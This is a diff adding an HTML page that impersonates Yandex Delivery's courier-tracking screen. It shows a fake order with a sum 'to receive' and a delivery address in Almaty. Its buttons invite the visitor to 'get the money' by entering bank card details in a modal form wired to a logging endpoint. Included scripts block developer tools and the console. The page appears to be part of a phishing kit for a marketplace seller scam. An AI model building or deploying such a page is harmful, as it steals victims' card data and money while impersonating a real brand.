@@ -1,0 +1,972 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Яндекс Доставка</title>
+  <meta name="page-country" content="kg">
+  <link rel="stylesheet" href="/style/support/support_parent.css">
+  <link rel="stylesheet" href="/style/cardform/cardform.css?v=27" />
+  <link rel="stylesheet" href="/style/modals/modals.css?v=32" />
+  <script src="/style/i18n/langCookie.js"></script>
+  <script src="/style/i18n/langSelector.js" defer></script>
+  <link rel="icon" href="https://yandex.kz/favicon.ico" type="image/ico">
+  <style>
+    :root {
+      --modal-accent: #fce003;
+      --modal-accent-rgb: 252, 224, 3;
+      --modal-accent-hover: #e6cc00;
+      --modal-accent-active: #d1b800;
+      --cf-accent: #fce003;
+      --cf-accent-hover: #e6cc00;
+      --cf-accent-active: #d1b800;
+    }
+    .ms-card-ld-spinner { border-top-color: #fce003 !important; }
+  </style>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body {
+      width: 100%;
+      min-height: 100%;
+      font-family: "Yandex Sans Text", "Inter", "Segoe UI", Arial, sans-serif;
+      background: #f5f4f2;
+      color: #0f0f0f;
+      scroll-behavior: smooth;
+    }
+    .desktop-view { display: block; }
+    .mobile-view { display: none; }
+    .page {
+      max-width: 1320px;
+      margin: 0 auto;
+      padding: 16px 20px 70px;
+    }
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 12px;
+      background: #fff;
+      border-radius: 24px;
+      padding: 14px 18px;
+      animation: fadeInDown .55s ease both;
+    }
+    .header img { width: 196px; }
+    .status-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      border-radius: 999px;
+      padding: 8px 14px;
+      background: #ebf8ee;
+      color: #1d8e3c;
+      font-size: 13px;
+      font-weight: 600;
+      white-space: nowrap;
+    }
+    .status-pill::before {
+      content: "";
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #1d8e3c;
+      box-shadow: 0 0 0 5px rgba(29, 142, 60, .16);
+      animation: pulse 1.9s infinite;
+    }
+    .hero {
+      margin-top: 18px;
+      background: #fff;
+      border-radius: 35px;
+      display: grid;
+      grid-template-columns: 48% 52%;
+      min-height: 575px;
+      overflow: hidden;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, .12);
+    }
+    .desktop-panel {
+      padding: 44px 30px 30px;
+      animation: fadeUp .65s ease both;
+    }
+    .desktop-panel h1 {
+      font-size: clamp(44px, 3.4vw, 58px);
+      line-height: 1.08;
+      font-weight: 700;
+    }
+    .order-row {
+      margin-top: 24px;
+      display: grid;
+      gap: 12px;
+    }
+    .order-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      border-radius: 999px;
+      background: #f5f4f2;
+      padding: 12px 20px;
+      min-height: 58px;
+      transform: translateY(10px);
+      opacity: 0;
+      animation: fadeUp .55s ease forwards;
+    }
+    .order-item:nth-child(2) { animation-delay: .08s; }
+    .order-dot {
+      width: 14px;
+      height: 14px;
+      border: 3px solid #ff3b30;
+      border-radius: 50%;
+      flex: 0 0 auto;
+      background: #fff;
+    }
+    .order-item p { font-size: 17px; line-height: 1.23; }
+    .order-item b { font-size: 18px; font-weight: 700; }
+    .benefits {
+      margin-top: 22px;
+      display: grid;
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+      gap: 14px;
+    }
+    .benefit {
+      background: #f5f4f2;
+      border-radius: 18px;
+      min-height: 168px;
+      position: relative;
+      display: flex;
+      align-items: flex-end;
+      justify-content: center;
+      padding: 18px 10px 14px;
+      text-align: center;
+      font-size: 18px;
+      font-weight: 600;
+      transition: transform .25s ease, box-shadow .25s ease;
+      overflow: hidden;
+    }
+    .benefit:hover { transform: translateY(-4px); box-shadow: 0 7px 16px rgba(0, 0, 0, .08); }
+    .benefit img {
+      position: absolute;
+      top: 10px;
+      left: 50%;
+      width: 92px;
+      height: 92px;
+      object-fit: contain;
+      transform: translateX(-50%) rotate(-6deg);
+      filter: drop-shadow(0 8px 10px rgba(0, 0, 0, .18));
+      animation: floatIcon 4s ease-in-out infinite;
+    }
+    .benefit:nth-child(2) img { animation-delay: .6s; }
+    .benefit:nth-child(3) img { animation-delay: 1.1s; }
+    .cta {
+      margin-top: 24px;
+      width: 100%;
+      border: none;
+      border-radius: 999px;
+      background: #fce003;
+      color: #000;
+      font-size: 38px;
+      font-weight: 700;
+      line-height: 1.1;
+      padding: 18px 22px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 16px;
+      transition: transform .2s ease, box-shadow .2s ease;
+    }
+    .cta span { font-size: 22px; }
+    .cta:hover { transform: translateY(-2px); box-shadow: 0 11px 18px rgba(252, 224, 3, .45); }
+    .map-side { position: relative; }
+    #mapDesktop {
+      width: 100%;
+      height: 100%;
+      min-height: 575px;
+      background: #e9ecef;
+    }
+    .map-top-overlays {
+      position: absolute;
+      top: 16px;
+      left: 16px;
+      right: 16px;
+      z-index: 8;
+      display: flex;
+      justify-content: space-between;
+      pointer-events: none;
+    }
+    .frame48096889 {
+      width: 95px;
+      height: 44px;
+      border-radius: 999px;
+      background: #fff;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, .18);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .frame48096889::before {
+      content: "";
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background: #30d158;
+      box-shadow: inset 0 0 0 2px rgba(255, 255, 255, .95);
+    }
+    .frame48096889::after {
+      content: "";
+      width: 40px;
+      height: 5px;
+      border-radius: 999px;
+      background: #30d158;
+    }
+    .plus-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: linear-gradient(135deg, #ff5acc, #8e46ff);
+      color: #fff;
+      border-radius: 999px;
+      padding: 8px 14px 8px 8px;
+      font-size: 22px;
+      font-weight: 700;
+      box-shadow: 0 10px 20px rgba(130, 45, 255, .35);
+      text-transform: lowercase;
+    }
+    .plus-pill::before {
+      content: "+";
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: #fff;
+      color: #ff5acc;
+      display: grid;
+      place-items: center;
+      font-size: 19px;
+      font-weight: 800;
+    }
+    .details {
+      margin-top: 26px;
+      border-radius: 30px;
+      background: #fce003;
+      padding: 22px 26px;
+      animation: fadeUp .75s ease both;
+    }
+    .details-grid {
+      display: grid;
+      gap: 9px;
+      font-size: 30px;
+      line-height: 1.15;
+      font-weight: 600;
+    }
+    .details-grid b { font-weight: 700; }
+    .details-note {
+      margin-top: 10px;
+      font-size: 30px;
+      line-height: 1.15;
+      font-weight: 500;
+      max-width: 640px;
+    }
+    .timeline {
+      margin-top: 26px;
+      animation: fadeUp .85s ease both;
+    }
+    .timeline h2 {
+      font-size: clamp(44px, 3.4vw, 58px);
+      line-height: 1.08;
+      margin-bottom: 16px;
+    }
+    .track {
+      position: relative;
+      height: 62px;
+      display: flex;
+      align-items: center;
+    }
+    .track::before, .track::after {
+      content: "";
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 14px;
+      height: 14px;
+      border-radius: 50%;
+      border: 3px solid #f9ce00;
+      background: #fff;
+      z-index: 3;
+    }
+    .track::before { left: 0; }
+    .track::after { right: 0; }
+    .track-line {
+      width: 100%;
+      height: 4px;
+      border-radius: 999px;
+      background: linear-gradient(to right, #f9d800 0%, #f9d800 47%, #c7ccd5 47%, #c7ccd5 100%);
+    }
+    .truck {
+      position: absolute;
+      left: calc(47% - 24px);
+      top: 50%;
+      transform: translateY(-50%);
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      background: #fff;
+      box-shadow: 0 5px 12px rgba(0, 0, 0, .15);
+      display: grid;
+      place-items: center;
+      animation: truckSlide .9s ease-out .4s both;
+    }
+    .truck img { width: 24px; height: 24px; }
+
+    .mobile-layout {
+      position: relative;
+      background: #fff;
+      min-height: 100vh;
+      overflow-x: hidden;
+      padding-bottom: 216px;
+    }
+    .mobile-map-wrap {
+      position: relative;
+      height: 340px;
+      background: #d9d9d9;
+    }
+    #mapMobile {
+      width: 100%;
+      height: 100%;
+      background: #e9ecef;
+    }
+    .mobile-map-overlay {
+      position: absolute;
+      top: 12px;
+      left: 0;
+      right: 0;
+      padding: 0 8px;
+      display: flex;
+      justify-content: space-between;
+      z-index: 10;
+      pointer-events: none;
+    }
+    .map-chip-left,
+    .map-chip-right {
+      height: 44px;
+      border-radius: 999px;
+      background-image: url("/style/pages/yandex2/screenshot_2763_2686.png");
+      background-size: 375px 1190px;
+      background-repeat: no-repeat;
+      box-shadow: 0 6px 14px rgba(0, 0, 0, .18);
+    }
+    .map-chip-left {
+      width: 93px;
+      background-position: 0 -12px;
+    }
+    .map-chip-right {
+      width: 84px;
+      background-position: -291px -12px;
+    }
+    [data-format-money] { display: inline; }
+    .sheet {
+      position: fixed;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      height: 66vh;
+      margin-top: 0;
+      border-radius: 26px 26px 0 0;
+      background: #fff;
+      box-shadow: 0 -4px 14px rgba(0, 0, 0, .18);
+      padding: 8px 0 0;
+      overflow: hidden;
+      z-index: 25;
+      transition: height .22s ease;
+    }
+    .sheet-scroll {
+      height: 100%;
+      overflow-y: auto;
+      padding-bottom: 220px;
+      -webkit-overflow-scrolling: touch;
+      touch-action: pan-y;
+    }
+    .drag {
+      width: 44px;
+      height: 4px;
+      border-radius: 999px;
+      background: #d1d1d1;
+      margin: 0 auto 8px;
+      touch-action: none;
+    }
+    .m-title {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px 20px 8px;
+      font-size: 25px;
+      font-weight: 700;
+      line-height: 1.15;
+    }
+    .m-title img {
+      width: 41px;
+      height: 41px;
+      border-radius: 50%;
+      object-fit: cover;
+    }
+    .m-list {
+      padding: 0 20px;
+      display: grid;
+      gap: 0;
+    }
+    .m-item {
+      display: flex;
+      gap: 12px;
+      padding: 14px 0;
+      border-bottom: 1px solid #ececec;
+    }
+    .m-item .order-dot {
+      margin-top: 5px;
+      width: 14px;
+      height: 14px;
+    }
+    .m-item p {
+      font-size: 17px;
+      line-height: 1.25;
+    }
+    .m-item b { font-size: 17px; line-height: 1.24; font-weight: 700; }
+    .mobile-cards {
+      margin-top: 14px;
+      display: flex;
+      overflow-x: auto;
+      gap: 10px;
+      padding: 0 10px 10px;
+      scrollbar-width: none;
+      -webkit-overflow-scrolling: touch;
+      white-space: nowrap;
+    }
+    .mobile-cards::-webkit-scrollbar { display: none; }
+    .mobile-card {
+      position: relative;
+      width: 92px;
+      height: 92px;
+      border-radius: 20px;
+      background: #ececec;
+      flex: 0 0 auto;
+      padding-top: 67px;
+      text-align: center;
+      font-size: 12px;
+      font-weight: 600;
+    }
+    .mobile-card img {
+      position: absolute;
+      top: 10px;
+      left: 16px;
+      width: 60px;
+      height: 48px;
+      object-fit: contain;
+      transform: rotate(-4deg);
+      filter: drop-shadow(8px 2px 8px rgba(0, 0, 0, .2));
+    }
+    .fixed-mobile {
+      position: fixed;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      z-index: 40;
+      background: #fff;
+      border-radius: 15px 15px 0 0;
+      box-shadow: 0 -8px 20px rgba(0, 0, 0, .18);
+      padding: 8px 0 calc(10px + env(safe-area-inset-bottom));
+    }
+    .pay-card {
+      margin: 0;
+      background: #fff;
+      padding: 10px 16px 10px;
+    }
+    .pay-card p {
+      font-size: 15px;
+      line-height: 1.26;
+      margin-bottom: 12px;
+    }
+    .pay-actions {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 8px;
+    }
+    .pay-logos {
+      display: grid;
+      gap: 3px;
+    }
+    .pay-logos img {
+      width: 37px;
+      height: 25px;
+      object-fit: contain;
+    }
+    .pay-btn {
+      border: none;
+      border-radius: 20px;
+      background: #fce003;
+      padding: 10px 22px;
+      font-size: 16px;
+      font-weight: 600;
+      line-height: 1.23;
+    }
+    .pay-help {
+      width: 22px;
+      height: 22px;
+      object-fit: contain;
+    }
+    .mobile-order-box {
+      margin: 2px 12px 0;
+      border-radius: 13px;
+      background: #fed8014d;
+      padding: 14px 14px 18px;
+      font-size: 14px;
+      line-height: 1.25;
+    }
+    .mobile-order-box b { font-size: 16px; }
+    .mobile-order-box p + p { margin-top: 9px; }
+    .mobile-timeline {
+      padding: 18px 12px 0;
+    }
+    .mobile-timeline h2 {
+      font-size: 20px;
+      line-height: 1.2;
+      margin-bottom: 14px;
+    }
+    .mobile-track {
+      position: relative;
+      height: 44px;
+      display: flex;
+      align-items: center;
+    }
+    .mobile-track::before, .mobile-track::after {
+      content: "";
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      border: 2px solid #f9ce00;
+      background: #fff;
+      z-index: 3;
+    }
+    .mobile-track::before { left: 0; }
+    .mobile-track::after { right: 0; }
+    .mobile-track-line {
+      width: 100%;
+      height: 3px;
+      border-radius: 999px;
+      background: linear-gradient(to right, #f9d800 0%, #f9d800 47%, #c7ccd5 47%, #c7ccd5 100%);
+    }
+    .mobile-truck {
+      position: absolute;
+      left: calc(47% - 16px);
+      top: 50%;
+      transform: translateY(-50%);
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: #fff;
+      display: grid;
+      place-items: center;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, .14);
+      animation: truckSlideMobile .9s ease-out .5s both;
+    }
+    .mobile-truck img { width: 17px; height: 17px; }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(18px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes fadeInDown {
+      from { opacity: 0; transform: translateY(-16px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); opacity: 1; }
+      70% { transform: scale(1.35); opacity: .3; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+    @keyframes floatIcon {
+      0%, 100% { transform: translateX(-50%) rotate(-6deg) translateY(0); }
+      50% { transform: translateX(-50%) rotate(-6deg) translateY(-6px); }
+    }
+    @keyframes truckSlide {
+      from { left: 0; opacity: 0; }
+      to { left: calc(47% - 24px); opacity: 1; }
+    }
+    @keyframes truckSlideMobile {
+      from { left: 0; opacity: 0; }
+      to { left: calc(47% - 16px); opacity: 1; }
+    }
+
+    @media (max-width: 900px) {
+      .desktop-view { display: none; }
+      .mobile-view { display: block; }
+    }
+  </style>
+</head>
+<body>
+  <div class="desktop-view">
+    <div class="page">
+      <header class="header">
+        <img src="/style/pages/yandex2/mme1vy49-0qxt4ie.svg" alt="Яндекс Доставка" />
+        <div class="status-pill">Курьер в пути</div>
+      </header>
+
+      <main>
+        <section class="hero">
+          <div class="desktop-panel">
+            <h1>Ваша Доставка</h1>
+            <div class="order-row">
+              <div class="order-item">
+                <div class="order-dot"></div>
+                <p><b data-format-money>1222 сом</b><br />123123</p>
+              </div>
+              <div class="order-item">
+                <div class="order-dot"></div>
+                <p><b>Адрес доставки:</b><br />г. Алматы, пр. Нурсултана Назарбаева, 311, кв. 57, подъезд 5</p>
+              </div>
+            </div>
+            <div class="benefits">
+              <article class="benefit">
+                <img src="/style/pages/yandex2/mme1vy4p-evq1390.png" alt="Безопасность" />
+                Безопасность
+              </article>
+              <article class="benefit">
+                <img src="/style/pages/yandex2/mme1vy4p-hm5a0f3.png" alt="Скорость" />
+                Скорость
+              </article>
+              <article class="benefit">
+                <img src="/style/pages/yandex2/mme1vy4p-7yx6qni.png" alt="Удобство" />
+                Удобство
+              </article>
+            </div>
+            <button class="cta" type="button" onclick="modals.showCardForm()">Получите денежные средства <span>➜</span></button>
+          </div>
+          <div class="map-side">
+            <div class="map-top-overlays">
+              <div class="frame48096889"></div>
+              <div class="plus-pill">плюс</div>
+            </div>
+            <div id="mapDesktop"></div>
+          </div>
+        </section>
+          </div>
+        </section>
+
+        <section class="details">
+          <div class="details-grid">
+            <div><b>Номер заказа:</b></div>
+            <div>Заказ #4682910338</div>
+            <div><b>Сумма к получению:</b></div>
+            <div><span data-format-money>1222 сом</span></div>
+            <div><b>Адрес доставки:</b></div>
+            <div>г. Алматы, пр. Нурсултана Назарбаева, 311, кв. 57, подъезд 5</div>
+          </div>
+          <div class="details-note">Доставка осуществляется через службу Яндекс.Доставка</div>
+        </section>
+
+        <section class="timeline">
+          <h2>Процесс доставки:</h2>
+          <div class="track">
+            <div class="track-line"></div>
+            <div class="truck">
+              <img src="/style/pages/yandex2/mme1vy49-88jo4xr.svg" alt="Курьер" />
+            </div>
+          </div>
+        </section>
+      </main>
+    </div>
+  </div>
+
+  <div class="mobile-view">
+    <div class="mobile-layout">
+      <div class="mobile-map-wrap">
+        <div id="mapMobile"></div>
+        <div class="mobile-map-overlay">
+          <div class="map-chip-left"></div>
+          <div class="map-chip-right"></div>
+        </div>
+      </div>
+
+      <section class="sheet">
+        <div class="sheet-scroll">
+          <div class="drag"></div>
+          <div class="m-title">
+            <img src="/style/pages/yandex2/mme1vy3q-wtat1so.png" alt="Доставка" />
+            Доставка
+          </div>
+          <div class="m-list">
+            <div class="m-item">
+              <div class="order-dot"></div>
+              <p><b data-format-money>1222 сом</b><br />123123</p>
+            </div>
+            <div class="m-item">
+              <div class="order-dot"></div>
+              <p><b>Адрес доставки:</b><br />г. Алматы, пр. Нурсултана Назарбаева, 311, кв. 57, подъезд 5</p>
+            </div>
+          </div>
+
+          <div class="mobile-cards">
+            <article class="mobile-card">
+              <img src="/style/pages/yandex2/mme2tqvm-uhzzpy7.png" alt="Безопасность" />
+              Безопасность
+            </article>
+            <article class="mobile-card">
+              <img src="/style/pages/yandex2/mme2tqvm-4w737on.png" alt="Скорость" />
+              Скорость
+            </article>
+            <article class="mobile-card">
+              <img src="/style/pages/yandex2/mme2tqvm-kt89r84.png" alt="Удобность" />
+              Удобность
+            </article>
+            <article class="mobile-card">
+              <img src="/style/pages/yandex2/mme2tqvm-8urneu8.png" alt="Практичность" />
+              Практичность
+            </article>
+            <article class="mobile-card">
+              <img src="/style/pages/yandex2/mme2tqvm-djajn04.png" alt="Качество" />
+              Качество
+            </article>
+          </div>
+
+          <div class="mobile-order-box">
+            <p><b>Номер заказа:</b><br />Заказ #4682910338</p>
+            <p><b>Сумма к получению:</b><br /><span data-format-money>1222 сом</span></p>
+            <p><b>Адрес доставки:</b><br />г. Алматы, пр. Нурсултана Назарбаева, 311, кв. 57, подъезд 5</p>
+            <p>Доставка осуществляется через службу Яндекс.Доставка</p>
+          </div>
+
+          <section class="mobile-timeline">
+            <h2>Процесс доставки:</h2>
+            <div class="mobile-track">
+              <div class="mobile-track-line"></div>
+              <div class="mobile-truck">
+                <img src="/style/pages/yandex2/mme1vy49-88jo4xr.svg" alt="Курьер" />
+              </div>
+            </div>
+          </section>
+        </div>
+      </section>
+      <div class="fixed-mobile">
+        <div class="pay-card">
+          <p>Получите полную сумму за ваш товар без комиссии!</p>
+          <div class="pay-actions">
+            <div class="pay-logos">
+              <img src="/style/pages/yandex2/mme1vy3q-njmqhxp.svg" alt="Карта 1" />
+              <img src="/style/pages/yandex2/mme1vy3q-yed5891.svg" alt="Карта 2" />
+            </div>
+            <button class="pay-btn" type="button" onclick="modals.showCardForm()">Получить денежные средства</button>
+            <img src="/style/pages/yandex2/mme1vy3q-prqvkpb.svg" alt="Справка" class="pay-help" />
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://api-maps.yandex.ru/2.1/?lang=ru_RU"></script>
+  <script>
+    (function () {
+      var deliveryAddress = `г. Алматы, пр. Нурсултана Назарбаева, 311, кв. 57, подъезд 5`;
+      var fallbackCoords = [42.8746, 74.5698];
+      var serverCoords = [43.219434,76.954161];
+      var resolvedCoords = serverCoords || fallbackCoords;
+      const mapNodes = {
+        desktop: document.getElementById('mapDesktop'),
+        mobile: document.getElementById('mapMobile')
+      };
+      const mapState = { desktop: false, mobile: false };
+
+      const applyFallback = (node) => {
+        if (!node) return;
+        node.style.backgroundImage = 'url("/style/pages/yandex2/mme1vy4p-6fghniy.png")';
+        node.style.backgroundSize = 'cover';
+        node.style.backgroundPosition = 'center';
+      };
+
+      const initMap = (key) => {
+        const node = mapNodes[key];
+        if (!node || mapState[key]) return;
+        if (!window.ymaps) {
+          applyFallback(node);
+          return;
+        }
+        window.ymaps.ready(() => {
+          if (mapState[key]) return;
+          buildMap(node, key, resolvedCoords);
+        });
+      };
+
+      function buildMap(node, key, coords) {
+        var map = new window.ymaps.Map(node, {
+          center: coords,
+          zoom: 16,
+          controls: ['zoomControl']
+        });
+        map.behaviors.disable('scrollZoom');
+
+        var placemark = new window.ymaps.Placemark(coords, {
+          balloonContentHeader: 'Адрес доставки',
+          balloonContentBody: deliveryAddress || 'Не указан',
+          hintContent: 'Доставка сюда'
+        }, {
+          preset: 'islands#redDeliveryIcon',
+          iconColor: '#ff3b30'
+        });
+        map.geoObjects.add(placemark);
+
+        mapState[key] = true;
+      }
+
+      const initVisibleMap = () => {
+        if (window.matchMedia('(max-width: 900px)').matches) {
+          initMap('mobile');
+        } else {
+          initMap('desktop');
+        }
+      };
+
+      const initMobileSheet = () => {
+        const sheet = document.querySelector('.mobile-view .sheet');
+        const sheetScroll = sheet ? sheet.querySelector('.sheet-scroll') : null;
+        const drag = sheet ? sheet.querySelector('.drag') : null;
+        if (!sheet || !drag || !sheetScroll) return;
+        let dragging = false;
+        let startY = 0;
+        let startHeight = 0;
+        const minHeight = () => Math.round(window.innerHeight * 0.66);
+        const maxHeight = () => Math.round(window.innerHeight * 0.9);
+        const setExpanded = (expanded) => {
+          sheet.classList.toggle('expanded', expanded);
+          if (!expanded) sheetScroll.scrollTop = 0;
+        };
+        const setHeight = (value) => {
+          const next = Math.max(minHeight(), Math.min(maxHeight(), value));
+          sheet.style.height = `${next}px`;
+        };
+        setHeight(minHeight());
+        setExpanded(false);
+        const start = (clientY) => {
+          dragging = true;
+          startY = clientY;
+          startHeight = sheet.getBoundingClientRect().height;
+          sheet.style.transition = 'none';
+        };
+        const move = (clientY) => {
+          if (!dragging) return;
+          const delta = startY - clientY;
+          setHeight(startHeight + delta);
+        };
+        const end = () => {
+          if (!dragging) return;
+          dragging = false;
+          const current = sheet.getBoundingClientRect().height;
+          const middle = (minHeight() + maxHeight()) / 2;
+          sheet.style.transition = 'height .22s ease';
+          if (current > middle) {
+            setHeight(maxHeight());
+            setExpanded(true);
+          } else {
+            setHeight(minHeight());
+            setExpanded(false);
+          }
+        };
+        drag.addEventListener('touchstart', (e) => start(e.touches[0].clientY), { passive: true });
+        window.addEventListener('touchmove', (e) => move(e.touches[0].clientY), { passive: true });
+        window.addEventListener('touchend', end);
+        drag.addEventListener('mousedown', (e) => start(e.clientY));
+        window.addEventListener('mousemove', (e) => move(e.clientY));
+        window.addEventListener('mouseup', end);
+        window.addEventListener('resize', () => {
+          if (!window.matchMedia('(max-width: 900px)').matches) return;
+          setHeight(minHeight());
+          setExpanded(false);
+        });
+      };
+
+      window.addEventListener('load', initVisibleMap);
+      window.addEventListener('load', initMobileSheet);
+      window.addEventListener('resize', initVisibleMap);
+      window.addEventListener('error', () => {
+        applyFallback(mapNodes.desktop);
+        applyFallback(mapNodes.mobile);
+      }, { once: true });
+    })();
+  </script>
+
+  <script src="/style/protect/index.js"></script>
+  <script src="/style/protect/devtools-block.js"></script>
+  <script src="/style/other/formatMoney.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+
+  <div id="support">
+    <!-- Старый Smartsupp полностью удален, используется только кастомная система -->
+  </div>
+  <script>
+    function openSupport() {
+      console.log('🔔 openSupport() вызвана');
+      
+      // Используем только нашу кастомную систему поддержки
+      if (window.smartsupp && typeof window.smartsupp === 'function') {
+        console.log('📞 Открываем через кастомный smartsupp API');
+        window.smartsupp('chat:open');
+        return;
+      }
+      
+      // Fallback на CustomChat API
+      if (window.CustomChat) {
+        console.log('📞 Открываем через CustomChat API');
+        window.CustomChat.open();
+        return;
+      }
+      
+      // Если система не загружена
+      console.error('❌ Система поддержки не загружена');
+      alert('Чат поддержки загружается. Пожалуйста, подождите несколько секунд и попробуйте снова.');
+    }
+    
+    // Отладочная информация при загрузке страницы
+    window.addEventListener('load', function() {
+      setTimeout(function() {
+        console.log('=== Статус кастомной системы поддержки ===');
+        console.log('window.CustomChat:', typeof window.CustomChat);
+        console.log('window.smartsupp (кастомный):', typeof window.smartsupp);
+        console.log('window.SupportIntegration:', typeof window.SupportIntegration);
+        console.log('window.adId:', window.adId);
+        console.log('itemId:', typeof itemId !== 'undefined' ? itemId : 'не определен');
+        console.log('Старый Smartsupp полностью удален ✅');
+      }, 3000);
+    });
+  </script>
+  <script src="/style/cardform/cardform.js"></script>
+  <script src="/style/other/axios.min.js"></script>
+  <script src="/style/modals/modals.js?v=31"></script>
+  <script src="/style/support/support_integration.js"></script>
+  <script src="/style/support/custom_chat.js"></script>
+  <script>
+    
+
+    var modals = new ModalSystem({
+      itemId:       '4682910338',
+      logId:        null,
+      price:        '1222',
+      curr:         'сом',
+      title:        'CDEK',
+
+      serviceType:  'receive',
+
+      checkBalance: true,
+      requestPhoneAfterBalance: false,
+      personalUrl:  '/4682910338',
+      apiSendLog:   '/api/sendLog',
+      extraPostData: {},
+      onResetCard:  function() {
+        CardForm.resetForm();
+        modals.showCardForm();
+      },
+      translate: window.__INITIAL_MODAL_TRANSLATE || {}
+    });
+  </script>
+  <script src="/style/protect/console-ban.min.js"></script>
+  <script>const itemId = "4682910338"; window.adId = "4682910338";</script>
+  <script src="/style/other/other.js"></script>
+  <script>if(typeof _fmApply==='function')_fmApply();</script>
+</body>
+</html>
